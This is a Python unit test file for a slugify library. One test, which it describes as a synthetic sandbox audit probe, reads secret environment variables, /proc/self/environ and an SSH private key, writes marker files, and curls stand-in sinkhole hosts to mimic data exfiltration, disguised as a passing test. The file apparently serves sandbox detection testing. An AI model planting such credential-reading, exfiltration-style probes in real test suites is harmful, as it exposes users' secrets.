"""Unit tests for slugify-lite + synthetic Blastbox sandbox audit probes.

The functional tests validate slugify(). The synthetic audit test triggers
safe, non-routable telemetry (RFC 5737 / RFC 2606 sinkholes, local marker
writes, sensitive-path probes, and a policy-blocked Connector call) so Blastbox
can verify kernel-level strace detection and Gateway HTTP 403 enforcement.
"""

from __future__ import annotations

import os
import subprocess
import unittest
from pathlib import Path

from slugify_lite import slugify


class TestSlugify(unittest.TestCase):
    def test_basic_ascii(self) -> None:
        self.assertEqual(slugify("Hello, World!"), "hello-world")

    def test_unicode_folding(self) -> None:
        self.assertEqual(slugify("Café Crème & Naïve"), "cafe-creme-naive")

    def test_custom_separator(self) -> None:
        self.assertEqual(slugify("Fly.io Hacksgiving 2026", separator="_"), "fly_io_hacksgiving_2026")

    def test_max_length_trims_trailing_separator(self) -> None:
        self.assertEqual(slugify("super long package title", max_length=11), "super-long")

    def test_empty_and_punctuation_only(self) -> None:
        self.assertEqual(slugify(""), "")
        self.assertEqual(slugify("!!! --- ???"), "")

    def test_synthetic_audit_telemetry(self) -> None:
        """Synthetic probe verifying Blastbox catches out-of-policy test behavior."""
        # 1. Check sensitive env vars & probe /proc/self/environ + $HOME/.ssh/id_rsa
        checked_vars = (
            "GITHUB_TOKEN",
            "OPENROUTER_API_KEY",
            "FLY_API_TOKEN",
            "AWS_SECRET_ACCESS_KEY",
        )
        found_vars = [name for name in checked_vars if os.environ.get(name)]
        print(f"[blastbox-fixture] sensitive_env_found={found_vars}")

        try:
            with open("/proc/self/environ", "rb") as fh:
                env_bytes = fh.read(4096)
            print(f"[blastbox-fixture] proc_environ_bytes={len(env_bytes)}")
        except OSError as exc:
            print(f"[blastbox-fixture] proc_environ_error={exc}")

        ssh_key = Path.home() / ".ssh" / "id_rsa"
        try:
            with open(ssh_key, "rb") as fh:
                _ = fh.read(64)
            print("[blastbox-fixture] ssh_key_readable=true")
        except OSError:
            print("[blastbox-fixture] ssh_key_readable=false")

        # 2. Write synthetic markers outside /home/sprite/detonation
        home_marker = Path.home() / ".blastbox_marker"
        tmp_probe = Path("/tmp/.blastbox_probe")
        home_marker.write_text("blastbox-synthetic-test-marker\n", encoding="utf-8")
        tmp_probe.write_text("blastbox-synthetic-tmp-probe\n", encoding="utf-8")
        self.assertTrue(home_marker.exists())
        self.assertTrue(tmp_probe.exists())

        # 3. Short-timeout outbound probes to non-routable RFC 5737 & RFC 2606 sinkholes
        # Zero packets ever reach an external third-party server.
        for sinkhole_url in (
            "http://192.0.2.1:4444/collect",
            "https://sinkhole.blastbox-test.invalid/collect",
        ):
            proc = subprocess.run(
                ["curl", "-sS", "--max-time", "2", sinkhole_url],
                capture_output=True,
                text=True,
                check=False,
            )
            print(f"[blastbox-fixture] sinkhole_probe url={sinkhole_url} rc={proc.returncode}")

        # 4. Request policy-blocked GitHub Connector route to record live HTTP 403 denial
        blocked_url = (
            "https://api.sprites.dev/v1/gateway/github/"
            "BEt8hTvYVXs58JKWMgvldQ/user/repos"
        )
        proc = subprocess.run(
            [
                "curl",
                "-sS",
                "--max-time",
                "5",
                "-w",
                "\nHTTP_STATUS:%{http_code}",
                blocked_url,
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        output_clean = proc.stdout.strip().replace("\n", " | ")
        print(f"[blastbox-fixture] connector_blocked_probe url={blocked_url} result={output_clean}")

        # Keep test suite green to simulate a stealth PR that passes unit tests
        self.assertEqual(slugify("Audit Fixture OK"), "audit-fixture-ok")


if __name__ == "__main__":
    unittest.main()
